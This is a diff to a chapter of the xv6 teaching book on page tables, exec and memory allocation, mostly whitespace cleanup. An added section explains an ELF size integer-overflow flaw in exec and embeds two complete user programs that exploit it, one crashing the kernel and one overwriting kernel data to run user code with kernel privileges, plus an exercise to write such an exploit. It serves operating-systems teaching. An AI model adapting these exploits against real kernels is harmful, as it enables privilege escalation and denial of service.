@@ -34,8 +34,8 @@ The x86 page table hardware connects these two kinds of addresses,
 by mapping each virtual address to a physical address.
 .PP
 An x86 page table is logically an array of 2^20
-(1,048,576) 
-.italic-index "page table entries (PTEs)". 
+(1,048,576)
+.italic-index "page table entries (PTEs)".
 Each PTE contains a
 20-bit physical page number (PPN) and some flags. The paging
 hardware translates a virtual address by using its top 20 bits
@@ -49,13 +49,13 @@ Such a chunk is called a
 .italic-index page .
 .figure x86_pagetable
 .PP
-As shown in 
+As shown in
 .figref x86_pagetable ,
 the actual translation happens in two steps.
 A page table is stored in physical memory as a two-level tree.
-The root of the tree is a 4096-byte 
-.italic-index "page directory" 
-that contains 1024 PTE-like references to 
+The root of the tree is a 4096-byte
+.italic-index "page directory"
+that contains 1024 PTE-like references to
 .italic-index "page table pages".
 Each page table page is an array of 1024 32-bit PTEs.
 The paging hardware uses the top 10 bits of a virtual address to
@@ -82,7 +82,7 @@ instruction fetches are allowed.
 .code-index PTE_U
 controls whether user programs are allowed to use the
 page; if clear, only the kernel is allowed to use the page.
-.figref x86_pagetable 
+.figref x86_pagetable
 shows how it all works.
 The flags and all other page hardware related structures are defined in
 .file "mmu.h"
@@ -91,7 +91,7 @@ The flags and all other page hardware related structures are defined in
 A few notes about terms.
 Physical memory refers to storage cells in DRAM.
 A byte of physical memory has an address, called a physical address.
-Instructions use only virtual addresses, which the 
+Instructions use only virtual addresses, which the
 paging hardware translates to physical addresses, and then
 sends to the DRAM hardware to read or write storage.
 At this level of discussion there is no such thing as virtual memory,
@@ -104,8 +104,8 @@ only virtual addresses.
 The page table created by
 .code entry
 has enough mappings to allow the kernel's C code to start running.
-However, 
-.code main 
+However,
+.code main
 immediately changes to a new page table by calling
 .code-index kvmalloc
 .line vm.c:/^kvmalloc/ ,
@@ -115,7 +115,7 @@ process address spaces.
 Each process has a separate page table, and xv6 tells
 the page table hardware to switch
 page tables when xv6 switches between processes.
-As shown in 
+As shown in
 .figref xv6_layout ,
 a process's user memory starts at virtual address
 zero and can grow up to
@@ -123,7 +123,7 @@ zero and can grow up to
 allowing a process to address up to 2 GB of memory.
 The file
 .file "memlayout.h"
-.sheet memlayout.h 
+.sheet memlayout.h
 declares the constants for xv6's memory layout,
 and macros to convert virtual to physical addresses.
 .PP
@@ -131,10 +131,10 @@ When a process asks xv6 for more memory,
 xv6 first finds free physical pages to provide the storage,
 and then adds PTEs to the process's page table that point
 to the new physical pages.
-xv6 sets the 
+xv6 sets the
 .code PTE_U ,
 .code PTE_W ,
-and 
+and
 .code PTE_P
 flags in these PTEs.
 Most processes do not use the entire user address space;
@@ -169,7 +169,7 @@ Xv6 does not set the
 flag in the PTEs above
 .address KERNBASE ,
 so only the kernel can use them.
-.PP 
+.PP
 Having every process's page table contain mappings for
 both user memory and the entire kernel is convenient
 when switching from user code to kernel code during
@@ -196,7 +196,7 @@ calls
 .code-index kvmalloc
 .line vm.c:/^kvmalloc/
 to create and switch to a page table with the mappings above
-.code KERNBASE 
+.code KERNBASE
 required for the kernel to run.
 Most of the work happens in
 .code-index setupkvm
@@ -205,7 +205,7 @@ It first allocates a page of memory to hold the page directory.
 Then it calls
 .code-index mappages
 to install the translations that the kernel needs,
-which are described in the 
+which are described in the
 .code-index kmap
 .line vm.c:/^}.kmap/
 array.
@@ -234,7 +234,7 @@ number, the desired permissions (
 .code PTE_W
 and/or
 .code PTE_U ),
-and 
+and
 .code PTE_P
 to mark the PTE as valid
 .line vm.c:/perm...PTE_P/ .
@@ -242,7 +242,7 @@ to mark the PTE as valid
 .code-index walkpgdir
 .line vm.c:/^walkpgdir/
 mimics the actions of the x86 paging hardware as it
-looks up the PTE for a virtual address (see 
+looks up the PTE for a virtual address (see
 .figref x86_pagetable ).
 .code walkpgdir
 uses the upper 10 bits of the virtual address to find
@@ -290,7 +290,7 @@ but that is sufficient to allocate the first kernel page table.
 .\"
 .PP
 The allocator's data structure is a
-.italic "free list" 
+.italic "free list"
 of physical memory pages that are available
 for allocation.
 Each free page's list element is a
@@ -303,7 +303,7 @@ It store each free page's
 structure in the free page itself,
 since there's nothing else stored there.
 The free list is
-protected by a spin lock 
+protected by a spin lock
 .line 'kalloc.c:/^struct.{/,/}/' .
 The list and the lock are wrapped in a struct
 to make clear that the lock protects the fields
@@ -317,7 +317,7 @@ locking in detail.
 .PP
 The function
 .code-index main
-calls 
+calls
 .code-index kinit1
 and
 .code-index kinit2
@@ -340,7 +340,7 @@ Instead it assumes that the machine has
 240 megabytes
 .code PHYSTOP ) (
 of physical memory, and uses all the memory between the end of the kernel
-and 
+and
 .code-index PHYSTOP
 as the initial pool of free memory.
 .code kinit1
@@ -366,7 +366,7 @@ addresses as mapped in high memory, not by their physical
 addresses, which is why
 .code kinit
 uses
-.code p2v(PHYSTOP) 
+.code p2v(PHYSTOP)
 to translate
 .code PHYSTOP
 (a physical address)
@@ -376,7 +376,7 @@ in order to perform arithmetic on them (e.g.,
 traversing all pages in
 .code kinit ),
 and sometimes uses addresses as pointers to read and
-write memory (e.g., manipulating the 
+write memory (e.g., manipulating the
 .code run
 structure stored in each page);
 this dual use of addresses is the main reason that the
@@ -388,7 +388,7 @@ change the type of the memory.
 The function
 .code kfree
 .line kalloc.c:/^kfree/
-begins by setting every byte in the 
+begins by setting every byte in the
 memory being freed to the value 1.
 This will cause code that uses memory after freeing it
 (uses ``dangling references'')
@@ -397,7 +397,7 @@ hopefully that will cause such code to break faster.
 Then
 .code kfree
 casts
-.code v 
+.code v
 to a pointer to
 .code struct
 .code run ,
@@ -412,10 +412,10 @@ removes and returns the first element in the free list.
 .\"
 .figure processlayout
 .PP
-.figref processlayout 
+.figref processlayout
 shows the layout of the user memory of an executing process in xv6.
 The heap is above the stack so that it can expand when the process
-calls 
+calls
 .code-index sbrk .
 The stack is a single page, and is
 shown with the initial contents as created by exec.
@@ -440,14 +440,14 @@ initializes the user part of an address space from a file stored in the file
 system.
 .code Exec
 .line exec.c:/^exec/
-opens the named binary 
+opens the named binary
 .code path
 using
 .code-index namei
 .line exec.c:/namei/ ,
 which is explained in Chapter \*[CH:FS].
-Then, it reads the ELF header. Xv6 applications are described in the widely-used 
-.italic-index "ELF format" , 
+Then, it reads the ELF header. Xv6 applications are described in the widely-used
+.italic-index "ELF format" ,
 defined in
 .file elf.h .
 An ELF binary consists of an ELF header,
@@ -506,7 +506,7 @@ the first user program created with
 .code exec ,
 looks like this:
 .P1
-# objdump -p _init 
+# objdump -p _init
 
 _init:     file format elf32-i386
 
@@ -521,16 +521,16 @@ may be less than the
 .code memsz ,
 indicating that the gap between them should be filled
 with zeroes (for C global variables) rather than read from the file.
-For 
+For
 .code /init ,
-.code filesz 
+.code filesz
 is 2240 bytes and
-.code memsz 
+.code memsz
 is 2252 bytes,
-and thus 
+and thus
 .code-index allocuvm
 allocates enough physical memory to hold 2252 bytes, but reads only 2240 bytes
-from the file 
+from the file
 .code /init .
 .PP
 .PP
@@ -540,13 +540,13 @@ allocates and initializes the user stack.
 It allocates just one stack page.
 .code Exec
 copies the argument strings to the top of the stack
-one at a time, recording the pointers to them in 
+one at a time, recording the pointers to them in
 .code-index ustack .
 It places a null pointer at the end of what will be the
 .code-index argv
 list passed to
 .code main .
-The first three entries in 
+The first three entries in
 .code ustack
 are the fake return PC,
 .code-index argc ,
@@ -554,13 +554,13 @@ and
 .code argv
 pointer.
 .PP
-.code Exec 
+.code Exec
 places an inaccessible page just below the stack page,
 so that programs that try to use more than one page will fault.
 This inaccessible page also allows
 .code exec
 to deal with arguments that are too large;
-in that situation, 
+in that situation,
 the
 .code-index copyout
 .line vm.c:/^copyout/
@@ -571,7 +571,7 @@ the destination page in not accessible, and will
 return \-1.
 .PP
 During the preparation of the new memory image,
-if 
+if
 .code exec
 detects an error like an invalid program segment,
 it jumps to the label
@@ -579,14 +579,14 @@ it jumps to the label
 frees the new image,
 and returns \-1.
 .code Exec
-must wait to free the old image until it 
+must wait to free the old image until it
 is sure that the system call will succeed:
 if the old image is gone,
 the system call cannot return \-1 to it.
 The only error cases in
 .code exec
 happen during the creation of the image.
-Once the image is complete, 
+Once the image is complete,
 .code exec
 can install the new image
 .line exec.c:/switchuvm/
@@ -595,6 +595,186 @@ and free the old one
 Finally,
 .code exec
 returns 0.
+.PP
+.PP
+.code Exec
+loads bytes from the ELF file into memory at locations specified by the ELF file. This
+is risky, because the user code may overwrite kernel code and data, accidentally
+or on purpose.  The former may crash the kernel if the user code has a bug. The
+latter could allow a user program to run with kernel privileges, which breaks
+isolation. xv6 performs a number of argument checks to avoid these risks.
+To understand the importance of these checks, consider what could happen
+if xv6 wouldn't check
+.code "if(ph.vaddr + ph.memsz < ph.vaddr)" .
+Then, a user could construct an ELF binary choosing
+.code ph.vaddr
+and
+.code ph.memsz
+in such a way that their sum would overflow in the argument to
+.code loaduvm ,
+and become 0x1000,
+bypassing the check
+.code "if(newsz >= KERNBASE)"
+in
+. code allocuvm .
+.code Allocuvm
+uses an unsigned integer to compute the address where to map the new pages.
+That integer,
+.code a ,
+wouldn't overflow and in the loop will reach an address above
+.code KERNBASE .
+.code Allocuvm
+will then allocate a new page in the kernel address space to which
+.code loaduvm
+loads data supplied by the ELF binary.  This could be exploited by a user
+program to run arbitrary user code with kernel privileges.  As this example
+illustrates, argument checking must be done with great care to avoid risks like
+these.  It is easy for a kernel developer to omit a crucial check, and
+real-world kernels have a long history of missing checks whose absence
+can be exploited by user programs to obtain kernel privileges.  It is likely that xv6 doesn't do a complete job of validating
+user-level data supplied to the kernel, which a malicious user program might be able to exploit to circumvent xv6's isolation.
+.ig
+Example exploit (due to mikecat).
+
+The exec() function in file exec.c had two vulnerabilities.
+
+denial of service via misaligned virtual address
+arbitrary code execution using wrapping in calculation of VM size
+This user application is a exploit code for the first vulnerability.
+
+#include "types.h"
+#include "user.h"
+#include "fcntl.h"
+
+void elfgen(char *name) {
+  static char magic[] = {
+    127,69,76,70,1,1,1,0,0,0,0,0,0,0,0,0,2,0,3,0,1,0,0,0,7,0,0,0,52,0,0,0,
+    84,0,0,0,0,0,0,0,52,0,32,0,1,0,40,0,3,0,2,0,1,0,0,0,204,0,0,0,7,0,0,0,
+    7,0,0,0,7,0,0,0,7,0,0,0,5,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
+    0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,
+    1,0,0,0,6,0,0,0,7,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,7,0,0,0,
+    3,0,0,0,0,0,0,0,0,0,0,0,211,0,0,0,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
+    0,0,0,0,184,2,0,0,0,205,64,0,46,116,101,120,116,0,46,115,116,114,116,97,98,0
+  };
+  int fd;
+  fd = open(name, O_CREATE | O_WRONLY);
+  if(fd == -1) {
+    printf(2, "open failed\n");
+    exit();
+  }
+  write(fd, magic, sizeof(magic));
+  close(fd);
+}
+
+int main(void) {
+  char name[] = "unaligned";
+  char *argv[2] = {name, 0};
+  elfgen(name);
+  exec(name, argv);
+  printf(2, "exec failed\n");
+  exit();
+}
+This program create ELF having vaddr which isn't multiple of PGSIZE and have the system read it via exec system call.
+Then, the misaligned virtual address is padded to loaduvm() and it leads to panic.
+
+This user application is a exploit code for the second vulnerability.
+
+#include "types.h"
+#include "user.h"
+#include "fcntl.h"
+
+/* Please see kernel.sym and set
+ *   DEVSW_ADDR = the address of devsw
+ *   PANIC_ADDR = the address of panic
+ */
+#define DEVSW_ADDR 0x801111c0u
+#define PANIC_ADDR 0x8010053du
+
+void shellcode(void*, char*, int);
+
+void set4bytes(char *p, uint data) {
+  int i;
+  for (i = 0; i < 4; i++) p[i] = (data >> (8 * i));
+}
+
+void elfgen(char *name) {
+  static char magic[] = {
+    127,69,76,70,1,1,1,0,0,0,11,0,0,0,0,0,2,0,3,0,1,0,0,0,0,0,0,0,52,0,0,0,
+    126,0,0,0,0,0,0,0,52,0,32,0,3,0,40,0,2,0,2,0,1,0,0,0,236,0,0,0,0,0,0,0,
+    0,0,0,0,7,0,0,0,7,0,0,0,5,0,0,0,0,16,0,0,1,0,0,0,2,1,0,0,0,0,0,0,
+    0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
+    0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,
+    1,0,0,0,6,0,0,0,0,0,0,0,236,0,0,0,7,0,0,0,0,0,0,0,0,0,0,0,0,16,0,0,
+    0,0,0,0,7,0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,19,1,0,0,15,0,0,0,0,0,0,0,
+    0,0,0,0,0,0,0,0,0,0,0,0,184,2,0,0,0,205,64,0,46,116,101,120,
+    116,0,46,115,116,114,116,97,98,0
+  };
+  static char bomb[(DEVSW_ADDR & 0xfff) + 4] = {0};
+  int fd;
+  fd = open(name, O_CREATE | O_WRONLY);
+  if(fd == -1) {
+    printf(2, "open failed\n");
+    exit();
+  }
+
+  /* address of the program to execute */
+  set4bytes(bomb + (DEVSW_ADDR & 0xfff), (uint)shellcode);
+  /* address of bomb */
+  set4bytes(magic + 0x5C, DEVSW_ADDR & 0xfffff000u);
+  /* size of bomb */
+  set4bytes(magic + 0x64, sizeof(bomb));
+  /* size on memory of bomb */
+  set4bytes(magic + 0x68, 0x1000 - (DEVSW_ADDR & 0xfffff000u));
+
+  /* ELF data */
+  write(fd, magic, sizeof(magic));
+  /* bomb */
+  write(fd, bomb, sizeof(bomb));
+
+  close(fd);
+}
+
+int main(void) {
+  char name[] = "devswhack";
+  char *argv[2] = {name, 0};
+  int pid;
+  elfgen(name);
+  pid = fork();
+  if (pid == -1) {
+    printf(2, "fork failed\n");
+  } else if (pid == 0) {
+    exec(name, argv);
+    printf(2, "exec failed\n");
+  } else {
+    int fd;
+    wait();
+    mknod("shellcode", 0, 0);
+    fd = open("shellcode", O_RDONLY);
+    if (fd < 0) {
+      printf(2, "open failed\n");
+    } else {
+      read(fd, 0, 1);
+      close(fd);
+    }
+  }
+  exit();
+}
+
+void shellcode(void* a, char* b, int c) {
+  void (*panic)(char*) = (void(*)(char*))PANIC_ADDR;
+  panic("vulnerable");
+
+  /* avoid warnings for unused arguments */
+  (void)a; (void)b; (void)c;
+}
+This program generates an ELF and have the system load it via exec system call.
+In loading this ELF, one of ph.vaddr + ph.memsz becomes 0x1000 due to integer wrapping.
+ph.vaddr is pointing at the kernel data, and loaduvm() will overwrite there.
+devsw[0].read will be overwritten by the address of shellcode() via this loading, and after that,
+when this process use read system call for special file with major = 0,
+the function shellcode(), which is created by a user, will be executed according to the overwritten devsw.
+..
+.PP
 .\"
 .section "Real world"
 .\"
@@ -618,7 +798,7 @@ to the per-CPU data area, but the x86 has so few general
 registers that the extra effort required to use segmentation
 is worthwhile.
 .PP
-On machines with lots of memory 
+On machines with lots of memory
 it might make sense to use
 the x86's 4 Mbyte ``super pages.''
 Small pages make sense
@@ -639,7 +819,7 @@ Xv6 sets the
 .code PTE_PS
 bit in these two PDEs to mark them as super pages.
 The kernel also tells the paging hardware to allow super pages by setting the
-.code-index CR_PSE 
+.code-index CR_PSE
 bit
 (Page Size Extension) in
 .register cr4.
@@ -650,7 +830,7 @@ On the x86, there are at least three common algorithms:
 the first is to probe the physical address space looking for
 regions that behave like memory, preserving the values
 written to them;
-the second is to read the number of kilobytes of 
+the second is to read the number of kilobytes of
 memory out of a known 16-bit location in the PC's non-volatile RAM;
 and the third is to look in BIOS memory
 for a memory layout table left as
@@ -671,26 +851,27 @@ ones.
 .\"
 .section "Exercises"
 .\"
+.PP
 1. Look at real operating systems to see how they size memory.
-
+.PP
 2. If xv6 had not used super pages, what would be the right declaration for
 .code entrypgdir?
-
+.PP
 3. Write a user program that grows its address space with 1 byte by calling
 .code sbrk(1) .
 Run the  program and investigate the page table for the program before the call
-to 
+to
 .code sbrk
 and after the call to
 .code sbrk .
 How much space has the kernel allocated?  What does the
 .code pte
 for the new memory contain?
-
+.PP
 4. Modify xv6 so that the pages for the kernel are shared among processes, which
 reduces memory consumption.
-
-5. Unix implementations of 
+.PP
+5. Unix implementations of
 .code exec
 traditionally include special handling for shell scripts.
 If the file to execute begins with the text
@@ -706,7 +887,7 @@ and
 .code myprog 's
 first line is
 .code #!/interp ,
-then 
+then
 .code exec
 runs
 .code /interp
@@ -715,3 +896,9 @@ with command line
 .code myprog
 .code arg1 .
 Implement support for this convention in xv6.
+.PP
+6. Delete the check
+.code "if(ph.vaddr + ph.memsz < ph.vaddr)"
+in
+.code exec.c ,
+and construct a user  program that exploits that the check is missing.
